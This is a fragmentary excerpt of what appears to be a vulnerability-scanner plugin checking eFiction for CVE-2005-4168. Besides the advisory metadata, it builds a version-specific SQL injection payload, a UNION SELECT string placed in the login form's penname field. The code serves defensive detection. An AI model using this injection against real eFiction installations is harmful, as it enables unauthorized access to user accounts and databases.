...
The installed version of eFiction is affected by numerous flaws :
  ...
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2005/Nov/302");
  script_set_attribute(attribute:"solution", value:
"Upgrade to eFiction 2.0.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2005-4168");
...
email = get_kb_item('SMTP/headers/To');
if (!email) email = 'me@example.com';
...
foreach dir (dirs) {
  ...
  r = http_send_recv3(method: 'GET', item:dir + "/user.php", port:port);
  if (isnull(r)) exit(0);
  ...
  if (
    ...
    basic_exploit = "'UNION SELECT 'd41d8cd98f00b204e9800998ecf8427e','" + SCRIPT_NAME + "',0,'',1,'" + email + "'";
    # - eFiction 2.0
    if ('<li ><a href="search.php?action=recent">' >< r[2]) {
      ver = "2.0";
      exploit = basic_exploit + ",'',''--";
    }
    # - eFiction 1.1
    ...
    if (!isnull(exploit)) {
      postdata = "penname=" + exploit +  "&" + "password=&" + "submit=submit";
